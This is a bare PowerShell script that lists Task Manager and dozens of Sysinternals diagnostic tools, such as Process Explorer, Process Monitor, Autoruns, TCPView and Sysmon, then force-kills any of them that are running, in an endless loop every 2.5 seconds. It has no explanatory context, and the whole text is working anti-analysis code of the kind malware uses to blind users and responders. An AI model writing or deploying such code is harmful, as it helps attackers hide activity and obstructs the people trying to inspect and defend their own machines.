$systool = @('Taskmgr','autologon','autoruns','autoruns64','bginfo','cacheset','clockres','clockres64','contig','contig64','coreinfo','diskmon.hlp','dmon.sys','dbgview','desktops','disk2vhd.chm','diskview','diskmon','eula.txt','findlinks','findlinks64','listdlls','listdlls64','loadord','loadord64','loadordc','loadordc64','portmon.cnt','portmon.hlp','procmon','psexec','psexec64','psgetsid','psgetsid64','psinfo','psinfo64','psloggedon','psloggedon64','psservice','psservice64','pstools.chm','rammap','regdelnull','regdelnull64','rootkitrevealer.chm','rootkitrevealer','shareenum','shellrunas','sysmon','sysmon64','tcpview.hlp','tcpvcon','tcpview','testlimit','testlimit64','vmmap.chm','volumeid','volumeid64','winobj.hlp','winobj','zoomit','accesschk','accesschk64','adrestore','autoruns.chm','autorunsc','autorunsc64','ctrl2cap.amd.sys','ctrl2cap','ctrl2cap.nt4.sys','ctrl2cap.nt5.sys','dbgview.chm','disk2vhd','diskext','diskext64','du','du64','efsdump','handle','handle64','hex2dec','hex2dec64','junction','junction64','ldmdump','livekd','livekd64','logonsessions','logonsessions64','movefile','movefile64','notmyfault','notmyfault64','notmyfaultc','notmyfaultc64','ntfsinfo','ntfsinfo64','pagedfrg','pagedfrg.hlp','pendmoves','pendmoves64','pipelist','pipelist64','portmon','procdump','procdump64','procexp.chm','procexp','procexp64','procmon.chm','psfile','psfile64','pskill','pskill64','pslist','pslist64','psloglist','pspasswd','pspasswd64','psping','psping64','psshutdown','pssuspend','pssuspend64','psversion.txt','readme.txt','regjump','ru','ru64','sdelete','sdelete64','sigcheck','sigcheck64','streams','streams64','strings','strings64','sync','sync64','tcpview.chm','vmmap','whois','whois64')

While($systool) 
{
    $process = Get-Process
    
    ForEach($process_name in $systool)
    {
        $process = Get-Process $process_name -ErrorAction SilentlyContinue
        if($process)
        {
            $process | Stop-Process -Force
        }
    }
    sleep(2.5)
}